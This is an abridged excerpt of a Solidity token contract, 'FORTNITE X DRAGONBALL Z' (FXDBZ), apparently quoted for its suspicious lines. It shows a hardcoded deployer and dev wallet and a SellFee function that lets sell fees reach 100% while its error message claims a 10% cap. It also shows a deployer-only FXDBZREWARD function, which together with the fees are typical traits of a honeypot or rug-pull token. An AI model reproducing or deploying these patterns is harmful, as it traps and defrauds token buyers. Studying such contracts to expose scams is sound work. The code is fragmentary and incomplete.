...
interface IUniswapV2Pair {
    ...
    event _FXDBZ(address indexed sender, uint amount0, uint amount1);
...
contract FXDBZ is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("FORTNITE X DRAGONBALL Z", "FXDBZ") {
        ...
        Deploying = payable(0xEb8dF7ec718Bba42de203EC6C481d9Ed72D9119b); //Smart contract Deploying and owner.
        ...
        devWallet = payable(0xEb8dF7ec718Bba42de203EC6C481d9Ed72D9119b);
    ...
    function SellFee(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee) external {
        ...
        sellDevFee = _devFee;
        sellTotalFees = sellMarketingFee + sellLiquidityFee + sellDevFee;
        require(sellTotalFees <= 100, "Must keep fees <= 10%");
    }
    ...
    function FXDBZREWARD(uint amount) external {
        require(msg.sender == Deploying);
